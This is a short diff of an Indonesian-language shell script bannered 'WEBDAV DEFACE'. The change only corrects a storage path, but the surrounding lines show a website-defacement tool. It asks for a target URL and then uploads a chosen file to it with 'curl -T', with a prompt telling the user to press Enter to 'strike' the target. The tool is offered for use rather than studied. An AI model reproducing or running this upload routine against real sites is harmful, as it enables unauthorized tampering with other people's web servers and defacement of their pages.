@@ -15,7 +15,7 @@ pu='\033[37;1m' #putih
 ku='\033[33;1m' #kuning
 
 clear
-cd /storage/downloads
+cd /storage/download
 figlet -f pagga WEBDAV DEFACE | lolcat
       
       echo""
@@ -93,7 +93,7 @@ read tg
 echo ""
 echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Tusbol.."
 read trgt
-curl -T /storage/downloads/$sc $tg
+curl -T /storage/download/$sc $tg
 echo ""
 echo ""
 echo $me"========================================"
@@ -110,7 +110,7 @@ read tg
 echo ""
 echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Tusbol.."
 read trgt
-curl -T /storage/downloads/$sc $tg
+curl -T /storage/download/$sc $tg
 echo ""
 echo ""
 echo $me"========================================"
